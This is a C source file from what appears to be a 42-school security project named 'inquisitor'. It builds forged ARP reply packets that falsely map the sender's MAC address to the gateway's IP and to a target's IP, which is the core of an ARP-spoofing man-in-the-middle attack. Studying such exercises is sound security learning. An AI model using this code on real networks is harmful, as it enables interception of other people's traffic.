/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   set_headers.c                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/11/22 12:06:53 by irifarac          #+#    #+#             */
/*   Updated: 2024/11/22 13:35:51 by irifarac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "inquisitor.h"

void	set_hdrs(struct ether_header *eth, struct ether_arp *arp, u_char *source_mac, char *ip_target)
{
	char	gateway_ip[16] = {0};

	get_gateway(gateway_ip);
	memset(eth->ether_dhost, 0xff, ETH_ALEN);
	memcpy(eth->ether_shost, source_mac, ETH_ALEN);
	eth->ether_type = htons(ETH_P_ARP);

	arp->arp_hrd = htons(ARPHRD_ETHER);
	arp->arp_pro = htons(ETH_P_IP);
	arp->arp_hln = ETH_ALEN;
	arp->arp_pln = 4;
	arp->arp_op = htons(ARPOP_REPLY);

	memcpy(arp->arp_sha, source_mac, ETH_ALEN);
	if (inet_pton(AF_INET, gateway_ip, arp->arp_spa) <= 0)
	{
		perror("inet_pton() error");
		exit (1);
	}
	memset(arp->arp_tha, 0, ETH_ALEN);
	if (inet_pton(AF_INET, ip_target, arp->arp_tpa) <= 0)
	{
		perror("inet_pton() error");
		exit (1);
	}
}

void	spoof_gateway(struct ether_header *eth, struct ether_arp *arp, u_char *source_mac, char *ip_target)
{
	char	gateway_ip[16] = {0};

	get_gateway(gateway_ip);
	memset(arp->arp_sha, 0, ETH_ALEN);
	memcpy(arp->arp_sha, source_mac, ETH_ALEN);
	if (inet_pton(AF_INET, ip_target, arp->arp_spa) <= 0)
	{
		perror("inet_pton() error");
		exit (1);
	}
	memset(arp->arp_tha, 0, ETH_ALEN);
	if (inet_pton(AF_INET, gateway_ip, arp->arp_tpa) <= 0)
	{
		perror("inet_pton() error");
		exit (1);
	}
	(void)eth;
}
